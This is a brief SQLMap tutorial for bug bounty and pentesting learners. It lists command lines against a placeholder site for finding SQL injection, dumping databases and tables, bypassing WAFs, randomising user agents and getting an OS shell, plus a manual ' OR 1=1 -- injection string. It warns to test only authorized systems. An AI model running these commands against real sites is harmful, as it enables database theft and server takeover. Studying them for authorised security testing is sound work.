1. What is SQLMap

  • Tool used to detect and exploit SQL Injection
  • Automates finding SQLi
  • Extracts database data
  • Dumps tables

👉 Very powerful for bug bounty & pentesting

⚠️ Important Rule

✔ Use only on authorized systems

❌ Never use on random websites

Install SQLMap

sudo apt update
sudo apt install sqlmap -y

🟢 Beginner Phase

Basic Scan

sqlmap -u "http://example.com/page?id=1"

Level & Risk

sqlmap -u "http://example.com/page?id=1" --level=5 --risk=3

Batch Mode

sqlmap -u "http://example.com/page?id=1" --batch

Find Databases

sqlmap -u "http://example.com/page?id=1" --dbs

🟡 Intermediate Phase

List Tables

sqlmap -u "http://example.com/page?id=1" -D database_name --tables

List Columns

sqlmap -u "http://example.com/page?id=1" -D database_name -T table_name --columns

Dump Data

sqlmap -u "http://example.com/page?id=1" -D database_name -T table_name --dump

POST Request

sqlmap -u "http://example.com/login" --data="username=admin&password=123"

Use Cookies

sqlmap -u "http://example.com/page" --cookie="PHPSESSID=xyz"

🔴 Advanced Phase

Burp Request File

sqlmap -r req.txt

Enumerate Everything

sqlmap -u "http://example.com/page?id=1" --dbs --tables --columns --dump

OS Shell

sqlmap -u "http://example.com/page?id=1" --os-shell

WAF Bypass

sqlmap -u "http://example.com/page?id=1" --tamper=space2comment

Random Agent

sqlmap -u "http://example.com/page?id=1" --random-agent

Threads

sqlmap -u "http://example.com/page?id=1" --threads=10

🧠 Real Bug Bounty Workflow

1. Find authorized target
2. Identify parameter (?id=1)
3. Test manually (' OR 1=1 --)
4. Run sqlmap --dbs
5. Extract data

💡 Pro Tips

  • Always test manually first
  • Use Burp + SQLMap together
  • Don’t blindly dump data
  • Understand the logic

🚀 Learning Progression

  • Beginner: Basic scan, DB detection
  • Intermediate: Tables, dump, POST
  • Advanced: Burp, WAF bypass, shell

🔥 Final Truth

SQLMap is powerful.

👉 But real hackers understand SQL first.

👉 Manual testing is key.
